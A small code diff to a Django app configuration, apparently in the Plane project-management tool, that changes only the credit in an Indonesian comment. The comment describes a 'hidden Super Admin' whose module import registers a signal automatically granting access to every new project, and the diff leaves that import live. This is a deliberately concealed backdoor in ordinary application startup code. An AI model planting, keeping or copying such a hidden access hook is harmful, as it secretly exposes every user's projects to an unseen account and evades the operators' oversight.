@@ -14,6 +14,6 @@ class DbConfig(AppConfig):
 
         register_audit_models()
 
-        # Super Admin tersembunyi (B.E.R): impor modulnya mendaftarkan signal
+        # Super Admin tersembunyi (Yorukaze Production): impor modulnya mendaftarkan signal
         # yang memberi akses ke setiap project baru secara otomatis.
         from plane.db import superadmin  # noqa: F401
